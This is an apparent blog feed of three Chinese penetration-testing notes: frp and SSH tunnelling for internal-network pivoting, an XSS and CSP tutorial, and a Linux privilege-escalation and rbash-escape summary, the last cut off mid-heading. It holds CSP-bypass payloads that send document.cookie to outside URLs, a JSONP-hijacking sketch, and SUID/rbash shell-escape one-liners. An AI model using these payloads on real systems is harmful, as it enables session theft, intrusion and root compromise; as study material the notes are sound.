<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ConsT27&#39;s Blog</title>
  
  
  <link href="http://const27.com/atom.xml" rel="self"/>
  
  <link href="http://const27.com/"/>
  <updated>2021-03-11T05:46:20.645Z</updated>
  <id>http://const27.com/</id>
  
  <author>
    <name>ConsT27</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>代理总结</title>
    <link href="http://const27.com/2021/03/24/%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/"/>
    <id>http://const27.com/2021/03/24/%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-23T16:50:57.356Z</published>
    <updated>2021-03-11T05:46:20.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h1><p>frp，确实蛮好用的，他基本不会被杀软杀掉。而且无论是win到win，linux到linux还是win到linux的转发，它都支持。 Download；<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>frp分为有两个主要可执行文件，frps和frpc，对应的配置文件为frps.ini和frpc.ini。</p><p>其中frps用作服务端，在进行渗透的时候一般架设在公网VPS上，它的配置文件默认为这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 10067  #监听的端口</span><br><span class="line"></span><br><span class="line">运行 frps -c frps.ini</span><br></pre></td></tr></table></figure><p>frpc用作客户端，在进行渗透的时候一般假设在内网机器上，它的默认文件一般长这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 149.17.4.190 # 指定需要转发到的公网IP</span><br><span class="line">server_port &#x3D; 10067 # 公网VPS上所监听的端口</span><br><span class="line"></span><br><span class="line">[socks_proxy] # 标签名，任意</span><br><span class="line">type &#x3D; tcp #设置转发的协议</span><br><span class="line">local_ip&#x3D;127.0.0.1 #填127.0.0.1就完事了</span><br><span class="line">local_port&#x3D;3389 #需要被转发的端口</span><br><span class="line">remote_port&#x3D;10068 #转发到VPS上的端口</span><br><span class="line"></span><br><span class="line">运行 frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>当我们在VPS上运行frps，内网机器运行frpc后，内网机器的3389端口就会被转发到公网的10068端口上，接下来我们远程链接 149.17.4.190:10068 即可连进内网机器的远程桌面了。</p><p>上面是端口映射，下面是直接走socks5代理</p><p>服务端:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr &#x3D; 0.0.0.0</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line"> </span><br><span class="line"># 用户密码保平安</span><br><span class="line">dashboard_user &#x3D; admin1</span><br><span class="line">dashboard_pwd &#x3D; hadaessd@@@!!@@#</span><br><span class="line"># 允许客户端绑定的端口</span><br><span class="line">allow_ports &#x3D; 40000-50000</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">#remote vps addr</span><br><span class="line">server_addr &#x3D; your vps addr</span><br><span class="line">#端口自选</span><br><span class="line">server_port &#x3D; 7000   </span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line">pool_count &#x3D; 5</span><br><span class="line"> </span><br><span class="line">[plugin_socks]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 46075</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; admin</span><br><span class="line">plugin_passwd &#x3D; hahha@@###</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><h1 id="ssh代理"><a href="#ssh代理" class="headerlink" title="ssh代理"></a>ssh代理</h1><p>在本机上执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -N -f -D 本地端口 用户名@远程服务器ip</span><br></pre></td></tr></table></figure><p>然后输入远程服务器上指定的用户名的密码，就可以通过指定的本地端口代入远程服务器内网了~</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309004816359.png" alt="image-20210309004816359"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309004828174.png" alt="image-20210309004828174"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;frp&quot;&gt;&lt;a href=&quot;#frp&quot; class=&quot;headerlink&quot; title=&quot;frp&quot;&gt;&lt;/a&gt;frp&lt;/h1&gt;&lt;p&gt;frp，确实蛮好用的，他基本不会被杀软杀掉。而且无论是win到win，linux到linux还是win到linux的转发，它都支持。</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>重温XSS</title>
    <link href="http://const27.com/2021/03/24/%E9%87%8D%E6%B8%A9XSS/"/>
    <id>http://const27.com/2021/03/24/%E9%87%8D%E6%B8%A9XSS/</id>
    <published>2021-03-23T16:50:01.823Z</published>
    <updated>2021-03-23T17:09:26.840Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="同源策略与跨域"><a href="#同源策略与跨域" class="headerlink" title="同源策略与跨域"></a>同源策略与跨域</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><h3 id="同源的定义"><a href="#同源的定义" class="headerlink" title="同源的定义"></a>同源的定义</h3><p>若两个URL 协议，端口，host都相同，则这两个URL同源。<br>这个方案叫做“协议/主机/端口元组”，或者直接是 “元组”</p><p>同源策略又分为DOM同源策略(禁止对不同源的页面的DOM进行操作)和XMLHttpRequest(禁止XHR对象项不同源的服务器地址发起HTTP请求)同源策略</p><h3 id="同源策略的作用"><a href="#同源策略的作用" class="headerlink" title="同源策略的作用"></a>同源策略的作用</h3><p>限制一个JS脚本对不同源的URL进行操作。</p><p>这么说可能会有点抽象，那不如看看下面的例子:</p><p>1.如果没有DOM同源策略，就意味着一个页面可以对任意页面的DOM进行操作。那么就会导致以下安全问题:<br>做一个假网站，并插入一个占满全页面的iframe指向一个登陆界面如银行登录界面。用户进来后会发现除了域名不同，其他都和正常的银行登陆界面一致。若用户输入了账号密码，那么我们就可以跨域读取到银行登陆界面的dom树，从而读取用户输入的账号密码。</p><p>2.如果没有XMLHttpRequest，就意味着可以一个页面可以向任意页面发起HTTP请求。那么就会导致以下安全问题:<br>当一个用户登陆了某个系统，如银行个人系统，此时银行网站会给用户返回cookie。如果用户此时访问了我们的恶意网站，就会执行我们恶意网站中的恶意AJAX代码，此AJAX代码会向银行网站发起HTTP请求，比如发起查询账户余额的请求（此时会默认附带用户的cookie）。银行页面发现cookie无误，就会返回请求的数据:账户余额，造成数据泄露。</p><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p>上面我们说了同源策略中，一个页面不能对不同源的页面进行操作。但是在实际情况中，还是有一些js标签能摆脱这种束缚,如script标签就能通过src属性获取不同源页面上的js代码，iframe能嵌入不同源站点的资源等等。<br>这样的标签有如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;...&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;img&gt; &#x2F; &lt;video&gt; &#x2F; &lt;audio&gt;</span><br><span class="line">&lt;object&gt; &lt;embed&gt; 和 &lt;applet&gt; 的插件</span><br><span class="line">@font-face</span><br><span class="line">&lt;frame&gt; 和 &lt;iframe&gt;</span><br></pre></td></tr></table></figure><p>但仅仅是这样，有些时候还是无法达到业务的需求，我们有时需要突破这种限制来达到业务需求，也就是避开同源策略，以下是几种解决方案。</p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>CORS，即跨域资源共享，它是一个W3C标准，定义了必须访问跨域资源时，浏览器和服务器该如何协商。<br>其实质就是以AJAX为载体，使用自定义HTTP头让浏览器与服务器进行协商，从而决定跨域请求是否应该成功。<br>所以实现CORS通信的关键是服务器是否实现了CORS接口。</p><p>另外，并不是所有浏览器都支持CORS，比如IE6,IE7,Opera min 不支持CORS。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>浏览器把CORS的请求分成两类:简单请求与非简单请求</p><p>简单请求:<br>满足以下条件，即为简单请求</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">请求方法是以下三种方法之一：</span><br><span class="line">HEAD</span><br><span class="line">GET</span><br><span class="line">POST</span><br><span class="line"></span><br><span class="line">且HTTP的头信息不超出以下几种字段：</span><br><span class="line">Accept</span><br><span class="line">Accept-Language</span><br><span class="line">Content-Language</span><br><span class="line">Last-Event-ID</span><br><span class="line">Content-Type：只限于三个值 application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain</span><br></pre></td></tr></table></figure><p>只要不满足以上条件，都为非简单请求。</p><p>对于简单请求，其实现原理如下:</p><p>1.在请求头中加一个额外头:Origin, 其包含发出请求的页面的协议，域名，端口，服务器以此来判断是否给予响应。<br>2.服务器收到请求后，判别该Origin指向的站点能否跨域。若能跨域，就在 Access-Control-Allow-Origin 头部中回发相同的源信息（如果是公共资源，可以回发 * ）；若不能跨域，则没有这个头部或者源信息不匹配（即Access-Control-Allow-Origin内容非*且与Origin不符）<br>3.同时如果服务器返回的头中有 Access-Control-Allow-Credentials: true ，则说明可以跨域向服务器发送带有cookie的HTTP请求。</p><p>对于非简单请求，它会实现进行预检，其原理如下:<br>1.进行预检，以OPTIONS方法向服务器发送Origin头部，Access-Control-Request-Method头部（接下来的请求方法，如POST），Access-Control-Request-Headers（自定义头部信息，可选）<br>2.服务器响应，有如下头:Access-Control-Allow-Origin,Access-Control-Allow-Methods(允许的请求方法)，Access-Control-Allow-Headers（允许的自定义头部信息），Access-Control-Max-Age（应该将预检请求缓存多长时间，以秒为单位）<br>3.通过预检请求后，以后每次浏览器的CORS请求都会和简单请求一样。</p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>我们不妨通过一个例子来窥视JSONP的实现原理。</p><p>我们有如下文件test.html</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;HI&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            var fun1&#x3D;function(data)&#123;</span><br><span class="line">                alert(data)</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;&#x2F;script&gt;</span><br><span class="line">        &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;192.168.111.1&#x2F;a.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>其包含的a.js如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fun1(&quot;remote data&quot;);</span><br></pre></td></tr></table></figure><p>访问test.html，成功触发弹窗，我们将test.html中的fun1函数称为回调函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322211050387.png" alt="image-20210322211050387"></p><p>于是就出现了利用这种原理来实现跨域传输数据的方法：JSONP</p><p>下面说说JSONP的具体实现流程:</p><p>客户端:<br>1.定义获取数据后的回调函数<br>2.动态生成服务端JS进行引用的代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">关于此处第2点，我们可以说道说道。</span><br><span class="line">我们再用这个方法实现跨域时，怎么让远程JS知道我们本地的回调函数叫什么名字？</span><br><span class="line">这就需要通过一些手段动态生成服务端的JS代码了。</span><br><span class="line">比如我们可以通过get参数来控制其返回的本地回调函数名，如: http:&#x2F;&#x2F;a.com?callback&#x3D;fun1</span><br></pre></td></tr></table></figure><p>服务端:<br>返回由回调函数名包裹的JSON数据，如</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fun1(&#123;</span><br><span class="line">&quot;key1&quot;:&quot;value1&quot;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里为什么要特别强调是JSON呢？因为JSON不仅可以简洁的表述复杂的数据，而且JS原生支持JSON，可以在客户端自由处理JSON数据，所以服务端多传回JSON数据，JSONP这个名字也是这么来的。</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><p>CSP，即内容安全策略。它通过白名单策略，告诉客户端哪些外部资源可以加载和执行。<br>同时需要注意的是，CSP目前有1.0 2.0 3.0 版本，每个版本的规则都有不同</p><h2 id="CSP规则"><a href="#CSP规则" class="headerlink" title="CSP规则"></a>CSP规则</h2><p>CSP通过定义一系列规则来实现安全管理。</p><p>首先我们来看看一条CSP规则的范例</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src https:&#x2F;&#x2F;host1.com https:&#x2F;&#x2F;host2.com; frame-src &#39;none&#39;; object-src &#39;none&#39;</span><br><span class="line">多个CSP指令间用分号隔开，多个指令值之间用空格隔开</span><br></pre></td></tr></table></figure><p>下面是各个指令及其指令值的效果</p><p>摘自<a href="https://blog.csdn.net/qq_37943295/article/details/79978761">https://blog.csdn.net/qq_37943295/article/details/79978761</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214229302.png" alt="image-20210322214229302"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214238476.png" alt="image-20210322214238476"></p><h2 id="启用CSP"><a href="#启用CSP" class="headerlink" title="启用CSP"></a>启用CSP</h2><p>那么如何启用CSP呢？有两种方式</p><p>1.在HTTP头添加<br>在HTTP头响应添加content-security-policy头并写入CSP规则以后，就能启用CSP了</p><p>图引用于<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html">http://www.ruanyifeng.com/blog/2016/09/csp.html</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214736472.png" alt="image-20210322214736472"></p><p>2.在meta标签里添加<br>向内添加如下内容</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br><span class="line">即可</span><br></pre></td></tr></table></figure><h1 id="一些其他XSS保护机制"><a href="#一些其他XSS保护机制" class="headerlink" title="一些其他XSS保护机制"></a>一些其他XSS保护机制</h1><h2 id="X-Frame"><a href="#X-Frame" class="headerlink" title="X-Frame"></a>X-Frame</h2><p>X-Frame-Options 是一个响应头，指定此页面能否在<frame>,<iframe>中插入.<br>他有三个可选值:</p><ul><li><p>DENY</p><p>页面不能被嵌入到任何iframe或frame中</p></li><li><p>SAMEORIGIN</p><p>页面只能被本站页面嵌入到iframe或者frame中</p></li><li><p>ALLOW-FROM uri</p><p>表示该页面可以在指定来源的 frame 中展示。</p></li></ul><h2 id="XSS-auditor"><a href="#XSS-auditor" class="headerlink" title="XSS auditor"></a>XSS auditor</h2><h2 id="httponly"><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h2><p>httponly 是一个针对cookie的保护机制。<br>其实现原理是在response中对某一项cookie设置为HTTPONLY=true，从而使该cookie不能被document.cookie 读取。</p><p>我们随便找个网站，发现其captch_session_v2开启了httponly</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210323115121425.png" alt="image-20210323115121425"></p><p>随后我们通过document.cookie尝试去读取aptch_session_v2的值，发现其值并没有出现在返回内容中<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210323115228944.png" alt="image-20210323115228944"></p><h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h2><p>htmlspecialchars是一个php函数，它可以将一些敏感字符转义</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp; (AND) &#x3D;&gt; &amp;</span><br><span class="line">&quot; (双引号) &#x3D;&gt; &quot; (当ENT_NOQUOTES没有设置的时候) </span><br><span class="line">&#39; (单引号) &#x3D;&gt; &amp;#039; (当ENT_QUOTES设置) </span><br><span class="line">&lt; (小于号) &#x3D;&gt; &lt; </span><br><span class="line">&gt; (大于号) &#x3D;&gt; &gt; </span><br></pre></td></tr></table></figure><h1 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h1><h2 id="bypass-csp"><a href="#bypass-csp" class="headerlink" title="bypass csp"></a>bypass csp</h2><p>csp，是可以被bypass的。我们接下来就想办法bypass csp来回传cookie</p><p>1</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-src &#39;none&#39;;</span><br></pre></td></tr></table></figure><p>可以通过meta标签实现重定向</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;1;url&#x3D;http:&#x2F;&#x2F;www.xxx.com&#x2F;x.php?cookie&#x3D;[cookie]&quot;&gt;</span><br></pre></td></tr></table></figure><p>即，1秒后跳转至指定url</p><p>2</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script-src ‘self’ ‘unsafe-inline’</span><br></pre></td></tr></table></figure><p>开放了内联脚本。我们可以通过window.location,windows.open或者meta标签实现页面跳转。也可以通过动态创建元素实现跳转</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a &#x3D; document.createElement(&quot;a&quot;);</span><br><span class="line">a.href&#x3D;&#39;http:&#x2F;&#x2F;www.baidu.com&#39;+document.cookie;</span><br><span class="line">a.click();</span><br></pre></td></tr></table></figure><p>3</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-src &#39;self&#39;; script-src &#39;self&#39;</span><br></pre></td></tr></table></figure><p>限制了只能加载本域JS脚本，同时禁止了内联脚本执行。<br>不过问题不大，如果我们有一个上传点，我们可以上传一个恶意JS文件，上传后如果我们知道此JS文件上传位置与文件名且上传的位置是本域，然后通过XSS实现加载此恶意JS文件。</p><p>另外在CSP1.0版本中，还可以通过以下方式进行跳转(现在不咋好用了)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;xxx.cn&quot;&gt; (H5预加载)</span><br><span class="line">&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;xxx.cn&quot;&gt; （DNS预加载）</span><br></pre></td></tr></table></figure><p>4</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script-src http:&#x2F;&#x2F;www.a.com&#x2F;b&#x2F; </span><br></pre></td></tr></table></figure><p>限制了只能从某特定路径去加载JS脚本<br>对此一般的解决方法是看看此目录下有没有可控重定向的文件，比如这种</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#x2F;302.php</span><br><span class="line">&lt;?php Header(&quot;location: &quot;.$_GET[&#39;url&#39;])?&gt;</span><br></pre></td></tr></table></figure><p>我们就可以插入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;b&#x2F;302.php?url&#x3D;http:&#x2F;&#x2F;a.com&#x2F;upload&#x2F;a.js&quot;&gt;  </span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>去加载我们上传的JS脚本（上传点自己找）</p><h2 id="JSONP-劫持"><a href="#JSONP-劫持" class="headerlink" title="JSONP 劫持"></a>JSONP 劫持</h2><p>简单说一说</p><p>首先存在网站B，它包含登录用户的ID,passwd等敏感信息。且有页面<a href="http://b.com/user?callback=">http://B.com/user?callback=</a>  用来进行JSONP跨域数据传输ID,PASSWD等信息，这是前提。<br>用户登录B后，打开了我们的恶意网站A.com,A.com的内容为:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;B.com&#x2F;user?jsonp&#x3D;Callback&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">function Callback(result)</span><br><span class="line">&#123;</span><br><span class="line">    将获取内容上传至恶意服务器的JS代码.....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么A网站就会向网站B跨域请求到敏感信息，并上传到恶意服务器保存。<br>这就是JSONP劫持，此方法常用于水坑攻击</p><h2 id="常用触发点与bypass"><a href="#常用触发点与bypass" class="headerlink" title="常用触发点与bypass"></a>常用触发点与bypass</h2><p><a href="https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html">https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h1 id=&quot;同源策略与跨域&quot;&gt;&lt;a href=&quot;#同源策略与跨域&quot; class=&quot;headerlink&quot; title=&quot;同源策略与跨域&quot;&gt;&lt;/a&gt;同源策略与跨</summary>
      
    
    
    
    
    <category term="外围打点" scheme="http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>Linux 提权总结</title>
    <link href="http://const27.com/2021/03/12/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>http://const27.com/2021/03/12/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-12T06:33:21.708Z</published>
    <updated>2021-03-16T13:36:09.073Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sudo-和-suid-提权"><a href="#sudo-和-suid-提权" class="headerlink" title="sudo 和 suid 提权"></a>sudo 和 suid 提权</h1><h2 id="何为suid"><a href="#何为suid" class="headerlink" title="何为suid"></a>何为suid</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145316.png" alt="QQ截图20210217145316"></p><p>可见在权限位置有一个s权限。那么这个s的作用是什么呢？<br>答案是当其他用户执行该文件时，该文件会以root的身份执行。<br>这里就涉及到了Effective UID和Real UID以及Saved UID<br>Effective UID: 程序实际操作时生效的UID<br>Real UID: 执行该程序的用户的实际UID<br>Saved UID: 在高权限用户降权后，保留的其原本UID (不展开说)</p><p>所以增加了一个s权限，该程序在实际运行时Effective UID就会变为0，即root的UID</p><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>就是能把一个命令视作root来执行,用sudo-l查看可以被sudo的命令</p><h2 id="SUID与sudo提权"><a href="#SUID与sudo提权" class="headerlink" title="SUID与sudo提权"></a>SUID与sudo提权</h2><h3 id="遍历目录中的suid文件"><a href="#遍历目录中的suid文件" class="headerlink" title="遍历目录中的suid文件"></a>遍历目录中的suid文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>执行该命令，会得到所有suid文件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145327.png" alt="QQ截图20210217145327"></p><h3 id="用sudo-l-查看哪些命令能被sudo"><a href="#用sudo-l-查看哪些命令能被sudo" class="headerlink" title="用sudo -l 查看哪些命令能被sudo"></a>用sudo -l 查看哪些命令能被sudo</h3><h3 id="可利用于提权的命令"><a href="#可利用于提权的命令" class="headerlink" title="可利用于提权的命令"></a>可利用于提权的命令</h3><h5 id="1-nmap"><a href="#1-nmap" class="headerlink" title="1.nmap"></a>1.nmap</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure><p>使用nmap的udp或tcp syn扫描时，需要用到root权限，所以有些管理员图方便会直接给namp上s权限，而nmap 5.20(使用nmap -v查看nmap版本)之前有一个interactive交互模式(nmap –interactive)，在nmap effective uid为0时，可以通过这个模式获得root权限交互式命令行，成功提权</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;os.execute(&#39;&#x2F;bin&#x2F;bash&#39;)&quot; &gt; .&#x2F;shell</span><br><span class="line">nmap --script&#x3D;shell</span><br></pre></td></tr></table></figure><p>全版本通杀提权，利用nmap可以执行指定文件的特点提权</p><h5 id="2-find"><a href="#2-find" class="headerlink" title="2.find"></a>2.find</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -exec command</span><br></pre></td></tr></table></figure><p>find命令自带-exec参数，可以执行命令，若find有suid权限，那么使用exec相当于直接提权到root.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">读文件 find &#x2F;path -exec &#123;&#125; \;</span><br></pre></td></tr></table></figure><h5 id="3-vim"><a href="#3-vim" class="headerlink" title="3.vim"></a>3.vim</h5><p>vim有了suid就可以任意文件读取了</p><p>同时也可以输入 :shell</p><p>来获取root shell</p><h5 id="4-bash"><a href="#4-bash" class="headerlink" title="4.bash"></a>4.bash</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -p  开启一个新shell，suid的话自然是开启root shell</span><br></pre></td></tr></table></figure><h5 id="5-less，more"><a href="#5-less，more" class="headerlink" title="5.less，more"></a>5.less，more</h5><p>和vim差不多，任意文件读取，同时也可以输入 !command 进行提权到root</p><h5 id="6-exim"><a href="#6-exim" class="headerlink" title="6.exim"></a>6.exim</h5><p>exim在特定版本下会有suid提权</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145341.png" alt="QQ截图20210217145341"></p><p>下载exp打就完事了</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="rbash-绕过"><a href="#rbash-绕过" class="headerlink" title="rbash 绕过"></a>rbash 绕过</h1><h2 id="何为rbash"><a href="#何为rbash" class="headerlink" title="何为rbash"></a>何为rbash</h2><p>rbash，是出于安全性考虑的一个功能受限的bash，我在vulnhub dc-2首次接触,他的限制性可能会有如下.</p><ul><li>cd 切换目录</li><li>含有斜杠 <code>/</code> 的命令, 譬如 <code>/bin/sh</code></li><li>设置 PATH ENV 等环境变量</li><li>使用 <code>&gt;</code> <code>&lt;</code> 进行重定向</li><li>binary 的运行. 通常 root 用户会手动创建 <code>/bin/binary_file -&gt; /home/rbash_user/bin/binary_file</code> 的软链接, 限制性地提供部分 binary_file 给 rbash_user 使用 在 bash 下 <code>echo $SHELL</code>, 可以获取当前环境是否是 rbash.</li></ul><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="scp-bypass"><a href="#scp-bypass" class="headerlink" title="scp bypass"></a>scp bypass</h3><p>我在<a href="http://www.const27.com/2020/07/02/vulnhub-dc-2/%E5%B0%B1%E6%98%AF%E7%94%A8scp%E7%BB%95%E7%9A%84">http://www.const27.com/2020/07/02/vulnhub-dc-2/就是用scp绕的</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145419.png" alt="QQ截图20210217145419"></p><h2 id="进入命令自带shell-bypass"><a href="#进入命令自带shell-bypass" class="headerlink" title="进入命令自带shell bypass"></a>进入命令自带shell bypass</h2><p>man,git config help,more,less,vim,vi,ftp,gdb等命令都有自己的shell，我们只需在他们各自的shell中执行/bin/sh即可<br>一般都是在shell键入!/bin/sh来bypass rbash</p><p>下面这种方法也是可行的（似乎仅vim)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>执行上面两个语句，就bypass了</p><h2 id="find-bypasss"><a href="#find-bypasss" class="headerlink" title="find bypasss"></a>find bypasss</h2><p>简单概括就是-exec执行一下/bin/bash …</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145437.png" alt="QQ截图20210217145437"></p><h2 id="编程语言-bypass"><a href="#编程语言-bypass" class="headerlink" title="编程语言 bypass"></a>编程语言 bypass</h2><p>python</p><p>如果python都可以用的话，那就更轻松了，os安排一下<br>似乎pty也行?没试</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure><p>php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -a 进入php shell</span><br><span class="line">然后执行命令:exec(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br></pre></td></tr></table></figure><p>perl</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;</span><br></pre></td></tr></table></figure><p>ruby</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;&#39;</span><br></pre></td></tr></table></figure><h2 id="cp-bypass"><a href="#cp-bypass" class="headerlink" title="cp bypass"></a>cp 